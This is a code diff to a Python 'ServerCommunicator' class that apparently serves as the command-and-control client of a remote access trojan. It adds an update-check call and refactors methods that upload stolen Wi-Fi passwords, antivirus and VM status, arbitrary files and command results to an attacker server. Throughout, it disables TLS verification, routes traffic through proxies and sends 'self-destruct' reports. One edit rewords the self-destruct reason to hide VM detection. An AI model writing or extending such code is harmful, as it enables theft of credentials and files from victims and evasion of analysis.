@@ -25,7 +25,8 @@ class ServerCommunicator:
     def __init__(self, client_id, encryption_manager):
         self.client_id = client_id
         self.encryption = encryption_manager
-        self.server_url = Config.SERVER_URL
+        self.server_url = Config.SERVER_URL.rstrip('/')
+        self.version_url = Config.UPDATE_URL
         self.token = Config.SECRET_TOKEN
         self.proxies = {
             "http": Config.PROXY_HTTP,
@@ -53,6 +54,37 @@ class ServerCommunicator:
                 logging.error(f"Connection error: {str(e)}")
             raise CommunicationError(f"Connection error: {str(e)}")
 
+    def check_version(self) -> Dict:
+        try:
+            if Config.DEBUG_MODE:
+                logging.info(f"Checking for updates: client_id={self.client_id}")
+            data = {
+                "action": "check_version",
+                "client_id": self.client_id,
+                "token": self.token
+            }
+            if Config.DEBUG_MODE:
+                logging.info(f"Sending version check request to {self.version_url}: {data}")
+            response = requests.post(
+                self.version_url,
+                json=data,
+                timeout=Config.COMMAND_TIMEOUT,
+                verify=False,
+                proxies=self.proxies
+            )
+            response.raise_for_status()
+            if Config.DEBUG_MODE:
+                logging.info(f"Version check response: status={response.status_code}, text={response.text}")
+            return response.json()
+        except requests.exceptions.RequestException as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Version check error: {str(e)}")
+            return {"error": f"Version check failed: {str(e)}"}
+        except json.JSONDecodeError:
+            if Config.DEBUG_MODE:
+                logging.error("Invalid JSON response from version check")
+            return {"error": "Invalid JSON response"}
+
     def report_rdp_tunnel(self, tunnel_info: Dict) -> Dict:
         try:
             if Config.DEBUG_MODE:
@@ -74,10 +106,7 @@ class ServerCommunicator:
                 verify=False,
                 proxies=self.proxies
             )
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"RDP tunnel report failed: status={response.status_code}, response={response.text}")
-                raise CommunicationError(f"RDP tunnel report failed: {response.text}")
+            response.raise_for_status()
             if Config.DEBUG_MODE:
                 logging.info("RDP tunnel report sent successfully")
             return response.json()
@@ -112,10 +141,7 @@ class ServerCommunicator:
                 verify=False,
                 proxies=self.proxies
             )
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Update report failed: status={response.status_code}, response={response.text}")
-                raise CommunicationError(f"Update report failed: {response.text}")
+            response.raise_for_status()
             if Config.DEBUG_MODE:
                 logging.info("Update report sent successfully")
             return response.json()
@@ -145,10 +171,7 @@ class ServerCommunicator:
                 verify=False,
                 proxies=self.proxies
             )
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"VM status upload failed: status={response.status_code}, response={response.text}")
-                raise CommunicationError(f"VM status upload failed: {response.text}")
+            response.raise_for_status()
             if Config.DEBUG_MODE:
                 logging.info("VM status upload successful")
             return response.json()
@@ -161,20 +184,16 @@ class ServerCommunicator:
         try:
             if Config.DEBUG_MODE:
                 logging.info(f"Antivirus status upload: client_id={self.client_id}")
-            
             antivirus_data_json = json.dumps(antivirus_data, ensure_ascii=False)
             encrypted_antivirus_data = self.encryption.encrypt(antivirus_data_json)
-            
             encrypted_data = {
                 "action": "upload_antivirus_status",
                 "client_id": self.client_id,
                 "token": self.token,
                 "antivirus_data": encrypted_antivirus_data
             }
-            
             if Config.DEBUG_MODE:
                 logging.info(f"Sending antivirus status: {encrypted_data}")
-            
             response = requests.post(
                 self.server_url,
                 data=encrypted_data,
@@ -182,28 +201,21 @@ class ServerCommunicator:
                 verify=False,
                 proxies=self.proxies
             )
-            
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Antivirus status upload failed: status={response.status_code}, response={response.text}")
-                raise CommunicationError(f"Antivirus status upload failed: {response.text}")
-            
+            response.raise_for_status()
             if Config.DEBUG_MODE:
                 logging.info("Antivirus status upload successful")
-            
             return response.json()
-        
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Antivirus status upload error: {str(e)}")
             raise CommunicationError(f"Antivirus status upload error: {str(e)}")
-        
+
     def report_self_destruct(self) -> Dict:
         try:
             if Config.DEBUG_MODE:
                 logging.info(f"Preparing self-destruct report: client_id={self.client_id}")
             report_data = {
-                "message": "Self-destruct initiated due to VM detection",
+                "message": "Self-destruct initiated due to critical error",
                 "client_id": self.client_id,
                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
             }
@@ -223,17 +235,14 @@ class ServerCommunicator:
                 verify=False,
                 proxies=self.proxies
             )
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Self-destruct report failed: status={response.status_code}, response={response.text}")
-                raise CommunicationError(f"Self-destruct report failed: {response.text}")
+            response.raise_for_status()
             if Config.DEBUG_MODE:
                 logging.info("Self-destruct report sent successfully")
             return response.json()
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Self-destruct report error: {str(e)}")
-            raise CommunicationError(f"Self-destruct report error: {str(e)}")
+            return {"error": f"Self-destruct report error: {str(e)}"}
 
     def _handle_response(self, response):
         if Config.DEBUG_MODE:
@@ -304,10 +313,7 @@ class ServerCommunicator:
                 verify=False,
                 proxies=self.proxies
             )
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Upload failed: status={response.status_code}, response={response.text}")
-                raise CommunicationError(f"Upload failed: {response.text}")
+            response.raise_for_status()
             if Config.DEBUG_MODE:
                 logging.info("Upload successful")
             return response.json()
@@ -364,20 +370,16 @@ class ServerCommunicator:
         try:
             if Config.DEBUG_MODE:
                 logging.info(f"Preparing Wi-Fi passwords upload: client_id={self.client_id}")
-            
             wifi_data_json = json.dumps(wifi_data, ensure_ascii=False)
             encrypted_wifi_data = self.encryption.encrypt(wifi_data_json)
-            
             encrypted_data = {
                 "action": "upload_wifi_passwords",
                 "client_id": self.client_id,
                 "token": self.token,
                 "wifi_data": encrypted_wifi_data
             }
-            
             if Config.DEBUG_MODE:
                 logging.info(f"Sending Wi-Fi passwords: {encrypted_data}")
-            
             response = requests.post(
                 self.server_url,
                 data=encrypted_data,
@@ -385,22 +387,15 @@ class ServerCommunicator:
                 verify=False,
                 proxies=self.proxies
             )
-            
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Wi-Fi passwords upload failed: status={response.status_code}, response={response.text}")
-                raise CommunicationError(f"Wi-Fi passwords upload failed: {response.text}")
-            
+            response.raise_for_status()
             if Config.DEBUG_MODE:
                 logging.info("Wi-Fi passwords upload successful")
-            
             return response.json()
-        
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Wi-Fi passwords upload error: {str(e)}")
             raise CommunicationError(f"Wi-Fi passwords upload error: {str(e)}")
-    
+
     def send_command_result(self, command_id, result):
         try:
             if Config.DEBUG_MODE:
@@ -437,7 +432,6 @@ class ServerCommunicator:
         try:
             if Config.DEBUG_MODE:
                 logging.info(f"Preparing file upload: client_id={self.client_id}, filename={file_data['filename']}")
-            
             files = {
                 "file": (file_data["filename"], file_data["content"], "application/octet-stream")
             }
@@ -447,10 +441,8 @@ class ServerCommunicator:
                 "token": self.token,
                 "timestamp": file_data["timestamp"]
             }
-            
             if Config.DEBUG_MODE:
                 logging.info(f"Sending file upload request: {data}")
-            
             response = requests.post(
                 self.server_url,
                 data=data,
@@ -459,17 +451,10 @@ class ServerCommunicator:
                 verify=False,
                 proxies=self.proxies
             )
-            
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"File upload failed: status={response.status_code}, response={response.text}")
-                raise CommunicationError(f"File upload failed: {response.text}")
-            
+            response.raise_for_status()
             if Config.DEBUG_MODE:
                 logging.info(f"File uploaded successfully: {file_data['filename']}")
-            
             return response.json()
-        
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"File upload error: {str(e)}")
